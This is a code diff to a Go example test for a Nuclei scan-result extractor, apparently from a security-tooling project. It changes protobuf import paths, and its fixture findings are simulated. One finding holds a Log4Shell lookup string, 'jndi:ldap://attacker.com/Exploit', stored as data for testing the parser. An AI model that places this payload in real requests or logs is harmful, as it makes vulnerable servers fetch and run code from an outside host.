@@ -5,7 +5,7 @@ import (
 	"fmt"
 
 	"github.com/zero-day-ai/gibson/internal/extraction"
-	nucleipb "github.com/zero-day-ai/tools/discovery/nuclei/gen"
+	"github.com/zero-day-ai/sdk/api/gen/toolspb"
 )
 
 // ExampleNucleiExtractor demonstrates how to use the NucleiExtractor
@@ -15,8 +15,8 @@ func Example_nucleiExtractor() {
 	extractor := extraction.NewNucleiExtractor()
 
 	// Simulate a nuclei scan response with a critical vulnerability
-	resp := &nucleipb.NucleiResponse{
-		Results: []*nucleipb.TemplateMatch{
+	resp := &toolspb.NucleiResponse{
+		Results: []*toolspb.TemplateMatch{
 			{
 				TemplateId:   "CVE-2021-44228",
 				TemplateName: "Apache Log4j RCE",
@@ -29,7 +29,7 @@ func Example_nucleiExtractor() {
 					"jndi:ldap://attacker.com/Exploit",
 					"log4j-core-2.14.1.jar",
 				},
-				Info: &nucleipb.TemplateInfo{
+				Info: &toolspb.TemplateInfo{
 					Name:        "Apache Log4j Remote Code Execution",
 					Author:      "security-team",
 					Severity:    "critical",
@@ -39,7 +39,7 @@ func Example_nucleiExtractor() {
 						"https://logging.apache.org/log4j/2.x/security.html",
 					},
 					Tags: []string{"cve", "rce", "log4j", "apache"},
-					Classification: &nucleipb.TemplateClassification{
+					Classification: &toolspb.TemplateClassification{
 						CveId:       []string{"CVE-2021-44228"},
 						CweId:       []string{"CWE-502"},
 						CvssMetrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
@@ -121,14 +121,14 @@ func Example_nucleiExtractor() {
 func Example_nucleiExtractor_multipleSeverities() {
 	extractor := extraction.NewNucleiExtractor()
 
-	resp := &nucleipb.NucleiResponse{
-		Results: []*nucleipb.TemplateMatch{
+	resp := &toolspb.NucleiResponse{
+		Results: []*toolspb.TemplateMatch{
 			{
 				TemplateId: "exposed-admin",
 				Host:       "example.com",
 				Url:        "https://example.com/admin",
 				MatchedAt:  "https://example.com/admin",
-				Info: &nucleipb.TemplateInfo{
+				Info: &toolspb.TemplateInfo{
 					Name:        "Admin Panel Exposed",
 					Severity:    "high",
 					Description: "Admin panel is publicly accessible",
@@ -139,7 +139,7 @@ func Example_nucleiExtractor_multipleSeverities() {
 				Host:       "example.com",
 				Url:        "https://example.com",
 				MatchedAt:  "https://example.com/debug",
-				Info: &nucleipb.TemplateInfo{
+				Info: &toolspb.TemplateInfo{
 					Name:        "Debug Mode Enabled",
 					Severity:    "medium",
 					Description: "Application is running in debug mode",
@@ -150,7 +150,7 @@ func Example_nucleiExtractor_multipleSeverities() {
 				Host:       "example.com",
 				Url:        "https://example.com",
 				MatchedAt:  "https://example.com",
-				Info: &nucleipb.TemplateInfo{
+				Info: &toolspb.TemplateInfo{
 					Name:        "Server Header Disclosure",
 					Severity:    "info",
 					Description: "Server version disclosed in headers",
